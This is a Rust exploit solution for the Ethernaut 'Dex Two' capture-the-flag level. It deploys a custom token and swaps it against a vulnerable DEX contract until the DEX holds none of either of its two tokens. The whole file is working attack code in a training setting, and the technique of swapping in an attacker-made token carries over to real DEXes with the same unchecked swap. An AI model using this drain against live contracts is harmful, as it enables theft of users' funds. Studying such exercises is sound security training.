//! Ethernaut 23 — Dex Two.
//!
//! Goal: Drain both designated tokens from `DexTwo`. The DEX starts with 100 of
//! each token, and your offender account starts with ten of each.
//!
//! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/levels/DexTwo.sol

use alloy::primitives::U256;
use async_trait::async_trait;
use ctf::Actor;
use ctf::ethereum::ethernaut::lvl23_dex_two::*;

pub struct Exploit;

alloy::sol!(
    #[sol(rpc)]
    ExploitToken,
    "out/DexTwoExploit.sol/DexTwoExploitToken.json"
);

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        let dex = DexTwo::new(target.address, offender.provider());

        let token1 = dex.token1().call().await?;
        let token2 = dex.token2().call().await?;

        let print_balances = async || {
            let offender_token1 =
                dex.balanceOf(token1, offender.address()).call().await?;
            let offender_token2 =
                dex.balanceOf(token2, offender.address()).call().await?;
            let dex_token1 =
                dex.balanceOf(token1, *dex.address()).call().await?;
            let dex_token2 =
                dex.balanceOf(token2, *dex.address()).call().await?;
            println!("\nasset\tme\tdex");
            println!("token1: {offender_token1}\t{dex_token1}");
            println!("token2: {offender_token2}\t{dex_token2}");

            eyre::Ok(())
        };

        print_balances().await?;

        let exploit_token =
            ExploitToken::deploy(offender.provider(), target.address).await?;
        dex.swap(*exploit_token.address(), token1, U256::from(100))
            .send()
            .await?
            .watch()
            .await?;

        print_balances().await?;

        let exploit_token =
            ExploitToken::deploy(offender.provider(), target.address).await?;
        dex.swap(*exploit_token.address(), token2, U256::from(100))
            .send()
            .await?
            .watch()
            .await?;

        print_balances().await?;

        Ok(())
    }
}
